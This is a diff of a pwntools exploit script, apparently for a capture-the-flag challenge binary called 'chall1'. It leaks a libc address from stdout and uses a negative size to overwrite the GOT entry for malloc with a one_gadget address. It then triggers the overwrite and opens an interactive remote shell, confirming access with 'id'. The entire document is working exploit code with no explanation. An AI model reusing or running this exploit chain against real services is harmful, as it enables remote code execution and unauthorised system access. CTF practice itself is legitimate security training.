@@ -3,75 +3,85 @@ from pwn import *
 import sys
 
 HOST = ''
-PORT = 0
+PORT = 11526
 
-LIBC = 0x067b58  # libc base
-FUNC = 0x03d0d3  # one shot gadget
-BASH = 0x17e0cf  # /bin/sh string incase system() falls in a good range (no nulls in it)
+target_elf = ELF('../bin/chall1')
+
+def get_one_gadgets(libc):
+	args = ["one_gadget", "-r"]
+	if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
+		args += ["-b", libc.hex()]
+	else:
+		args += [libc]
+	return [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]
+
 
 if len(sys.argv) > 1:
 	HOST = sys.argv[1]
 
 if len(sys.argv) > 2:
-	PORT = sys.argv[2]
+	PORT = int(sys.argv[2])
 
 if len(HOST) > 0:
-	LIBC = 0x067378  # libc base
-	FUNC = 0x03cd10  # one shot gadget
-	BASH = 0x17b8cf  # /bin/sh string incase system() falls in a good range (no nulls in it)
-
+	target_libc = ELF('../bin/libc.so.6')
 	io = remote(HOST, PORT)
 else:
+	target_libc = target_elf.libc
+	io = target_elf.process()
 
-	io = process('../chall1')
+one_gadgets = get_one_gadgets(target_libc.path)
 
-io.recvuntil('challenges\n\n')
+pause()
+
+io.recvuntil(b'challenges\n\n')
 
 # step 1: leak
+io.recvuntil(b'size: ')
+io.sendline(b'4')
 
-io.recvuntil(': ')  # size
-io.sendline('10')
+io.recvuntil(b'data: ')
+io.send(b'xxxx\r')
 
-io.recvuntil(': ')  # data
-io.send('xxxx\r')
+io.recvuntil(b'resp: ')
+io.recvuntil(b'kkkk')
+leak = io.recv(4)
+leak = u32(leak)
+libc = leak - target_libc.symbols['_IO_2_1_stdout_']
+func = libc + random.choice(one_gadgets) # one shot gadget, pick one of them
+bash = next(libc+addr for addr in target_libc.search(b'/bin/sh') if b'\x00' not in p32(libc+addr)) # If system contains null-byte, error out and try again
 
-io.recvuntil(': ')  # resp
-leak = io.recvline().strip()
-leak = u32(leak[-4:])
-libc = leak - LIBC
-func = libc + FUNC
-bash = libc + BASH
+log.info('leak: %#010x' % leak)
+log.info('libc: %#010x' % libc)
+log.info('func: %#010x' % func)
 
-log.info('leak:  0x%08x' % leak)
-log.info('libc:  0x%08x' % libc)
-log.info('func:  0x%08x' % func)
-
-io.recvuntil(': ')  # more?
-io.sendline('y')
+io.recvuntil(b'more? (y/n): ')
+io.sendline(b'y')
 
 # step 2: write GOT
+io.recvuntil(b'size: ')
+io.sendline(b'-1')
 
-io.recvuntil(': ')  # size
-io.sendline('-1')
+io.recvuntil(b'data: ')
+io.sendline(p32(func) + b'\x00'*60 + b'\x08' + p32(target_elf.symbols['got.malloc']))
 
-io.recvuntil(': ')  # data
-io.sendline(p32(func)+'\x00'*60+'\x08'+p32(0x805202c))
-
-io.recvuntil(': ')  # resp
+io.recvuntil(b'resp: ')
 io.recvline()
 
-io.recvuntil(': ')  # more?
-io.sendline('y')
+io.recvuntil(b'more? (y/n): ')
+io.sendline(b'y')
 
 # step 3: trigger
+io.recvuntil(b'size: ')
+io.sendline(b'-' + str(0x100000000 - bash).encode('ascii'))
 
-io.recvuntil(': ')  # size
-io.sendline('-'+str(0x100000000 - bash))
-
-io.recvuntil(': ')  # data
+io.recvuntil(b'data: ')
 io.sendline()
 
 # step 4: enjoy a nice shell
-io.sendline('id')
-log.success('shell: %s' % io.recvline().strip())
-#io.interactive()
+io.sendline(b'id')
+id_result = io.recvline()
+if b'uid=999(ctf)' in id_result:
+	log.success('shell: %s', id_result.decode('ascii').strip())
+	io.interactive()
+else:
+	log.failure('error: %s', id_result)
